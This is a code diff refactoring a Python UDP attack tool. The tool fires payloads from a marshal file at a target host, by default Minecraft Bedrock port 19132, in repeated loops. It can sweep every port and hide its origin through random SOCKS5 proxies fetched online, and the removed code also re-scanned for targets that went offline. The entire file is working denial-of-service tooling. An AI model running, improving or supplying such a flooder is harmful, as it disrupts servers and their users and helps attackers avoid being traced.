@@ -1,70 +1,22 @@
 import marshal
 import random
 import socket
-import subprocess
-import sys
 import time
 import os
-from motd import sendPacket as sendMotdPacket
-from api import getLocalHostIP, getTime, log
+import argparse
 
-try:
-    import wget
-    import socks
-    import requests
-except:
-    log("Import module error! Please run \"pip install -r requirements.txt\"")
-    os._exit(1)
-
-localHostIP = getLocalHostIP()
-
-
-def getOptions():
-    try:
-        target = sys.argv[1]
-        port = sys.argv[2]
-        file = sys.argv[3]
-        loops = sys.argv[4]
-        interval = sys.argv[5]
-        isDisplayMotd = sys.argv[6]
-        proxyUsed = sys.argv[7]
-    except:
-        target = input("Target(IP/Domain): ")
-        port = input("Port(Number): ")
-        file = input("File(Path): ")
-        loops = input("Loops(Number): ")
-        interval = input("Interval(sec): ")
-        isDisplayMotd = input("Display Motd(y/n): ")
-        proxyUsed = input("Proxy(y/n): ")
-    proxyCountry = ""
-    if proxyUsed == "y":
-        try:
-            proxyCountry = sys.argv[8]
-        except:
-            proxyCountry = input("ProxyCountry(like cn, ru, us or enter to use all): ")
-        log(f"Proxy mode is under development and deprecated!")
-        proxyUsed = True
-    else:
-        proxyUsed = False
-
-    if isDisplayMotd == "y":
-        isDisplayMotd = True
-    else:
-        isDisplayMotd = False
-    print()
-    return target, int(port), file, int(loops), float(interval), proxyUsed, isDisplayMotd, proxyCountry
-
-
+from motd import send_pkt as send_motd_pkt
+from api import get_udp_socket, log
 
 
 def getProxy() -> list:
     try:
         log(f"Trying to get proxy data from api...")
-        proxyInfo = requests.get(
+        proxy_info = requests.get(
             f"https://www.proxyscan.io/api/proxy?last_check=3600&uptime=&ping=&limit=1&type=socks5&format=json&country={proxyCountry}").json()
-        proxyIP = proxyInfo[0]['Ip']
-        proxyPort = proxyInfo[0]['Port']
-        return proxyIP, int(proxyPort)
+        proxy_addr = proxy_info[0]['Ip']
+        proxy_port = proxy_info[0]['Port']
+        return proxy_addr, int(proxy_port)
     except:
         if not os.path.exists(r"socks5.txt"):
             log(f"Request api failed. Downloading proxy list...")
@@ -73,92 +25,54 @@ def getProxy() -> list:
             print()
             log(f"Proxy list downloaded!")
         with open("socks5.txt", "r") as file:
-            socksList = file.readlines()
-            randomIndex = random.randint(0, len(socksList) - 1)
-            proxy = socksList[randomIndex]
-            proxyIP, proxyPort = proxy.rsplit(':', 1)
-            #log(proxyIP, ":", proxyPort)
-            return proxyIP, int(proxyPort)
+            socks_list = file.readlines()
+            random_index = random.randint(0, len(socks_list) - 1)
+            proxy = socks_list[random_index]
+            proxy_addr, proxy_port = proxy.rsplit(':', 1)
+            return proxy_addr, int(proxy_port)
 
 
 def createSocket():
-    localPort = random.randint(1024, 65535)
-    proxyIP, proxyPort = None, None
-    if proxyUsed:
-        socketSend = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
-        proxyIP, proxyPort = getProxy()
-        socketSend.set_proxy(socks.SOCKS5, proxyIP, proxyPort)
-        if proxyUsed:
-            log(f"Used proxy: {proxyIP}:{proxyPort}")
+    local_port = random.randint(1024, 65535)
+    proxy_addr, proxy_port = None, None
+    if proxy_used:
+        udp_skt = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
+        proxy_addr, proxy_port = getProxy()
+        udp_skt.set_proxy(socks.SOCKS5, proxy_addr, proxy_port)
+        if proxy_used:
+            log(f"Used proxy: {proxy_addr}:{proxy_port}")
     else:
-        socketSend = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        socketSend.bind((str(localHostIP), localPort))
-    return localPort, socketSend
+        udp_skt = get_udp_socket(local_port)
+    return local_port, udp_skt
 
 
-def sendPacket(target: str, port, payloadFile: str, loops, interval):
-    targetAddr = target
-    autoScan = port
-    targetFile, targetInfo = target.split(":")
-    targetFileToScan = targetFile
-    scanProcess = False
+def send_pkt(target_addr: str, port: int, payload_file: str, loops: int, interval: float):
     for i in range(loops):
-        if ":" in target:
-            with open(targetFile, "r", encoding="utf-8") as file: #, encoding="utf-8"
-                fileContent = file.readlines()
-                contentCount = len(fileContent)
-                for index in range(contentCount):
-                    # print(contentCount)
-                    # print(index)
-                    info = fileContent[contentCount-index-1]
-                    if targetInfo in info:
-                        if not scanProcess:
-                            log("Found target info:")
-                            log(info)
-                        targetAddr = info.split(" | ")[2]
-                        port = info.split(" | ")[3]
-                        break
         try:
-            localPort, socketSend = createSocket()
+            local_port, udp_skt = createSocket()
         except:
             continue
         payloads = None
         try:
-            payloads = marshal.load(open(payloadFile, "rb"))
+            payloads = marshal.load(open(payload_file, "rb"))
         except:
-            log(f"Payload file {payloadFile} not found!")
-            sys.exit()
+            log(f"Payload file {payload_file} not found!")
+            os._exit(114514)
         try:
-            if isDisplayMotd:
-                sendMotdPacket(targetAddr, port)
-                if scanProcess:
-                    scanProcess.kill()
-                    scanProcess = False
+            if is_display_motd:
+                send_motd_pkt(target_addr, port)
         except:
-            if isDisplayMotd:
-                if scanProcess:
-                    if scanProcess.poll() != None:
-                        scanProcess = False
-                if ":" in target and int(autoScan) == 8:
-                    if not scanProcess:
-                        log(f"Target server offline.")
-                        log(f"Starting refresh ip list...")
-                        scanProcess = subprocess.Popen(["python", "scan.py", targetFileToScan, "10000-20000", "nn", "0", targetFileToScan])
-                        targetFile = "updated.txt"
-                else:
-                    log(f"Target server offline.")
-                #log(f"Sending packet...")
+            if is_display_motd:
+                log(f"Target server offline.")
         try:
             if port == "*":
                 for port in range(65535):
                     for line in payloads:
-                        socketSend.sendto(line, (targetAddr, port))
+                        udp_skt.sendto(line, (target_addr, port))
             else:
                 for line in payloads:
-                    socketSend.sendto(line, (targetAddr, int(port)))
-            if not scanProcess:
-                # if scanProcess.poll() != None:
-                log(f"Loop {i} done, used local port: {localPort} \n")
+                    udp_skt.sendto(line, (target_addr, int(port)))
+            log(f"Loop {i} done, used local port: {local_port} \n")
         except:
             log(f"Loop {i} error! Skip...\n")
             pass
@@ -167,5 +81,35 @@ def sendPacket(target: str, port, payloadFile: str, loops, interval):
 
 
 if __name__ == "__main__":
-    target, port, file, loops, interval, proxyUsed, isDisplayMotd, proxyCountry = getOptions()
-    sendPacket(target, port, file, loops, interval)
+    parser = argparse.ArgumentParser()
+    parser.add_argument("target", type=str, help="Target (IP/Domain)")
+    parser.add_argument("file", type=str, help="Payload file path")
+    parser.add_argument("-p", "--port", type=int, default=19132, help="Port (Number)")
+    parser.add_argument("-l", "--loops", type=int, default=1, help="Loops (Number)")
+    parser.add_argument("-i", "--interval", type=float, default=10, help="Interval (sec)")
+    parser.add_argument("-d", "--display_motd", type=bool, action="store_true", default=False, help="Display Motd")
+    parser.add_argument("-pu", "--proxy_used", type=bool, action="store_true", default=False, help="Use Proxy")
+    parser.add_argument("-pc", "--proxy_country", type=str, default="us", help="ProxyCountry (like cn, ru, us or enter to use all)")
+    args = parser.parse_args()
+    
+    target = args.target
+    port = args.port
+    file = args.file
+    loops = args.loops
+    interval = args.interval
+    is_display_motd = args.display_motd
+    proxy_used = args.proxy_used
+    proxyCountry = args.proxy_country
+    
+    if proxy_used:
+        try:
+            import wget
+            import socks
+            import requests
+        except Exception as error:
+            print(error)
+            log("Import module error! Please run \"pip install -r requirements.txt\"")
+            os._exit(1)
+        log("Proxy mode is under development!")
+    
+    send_pkt(target, port, file, loops, interval)
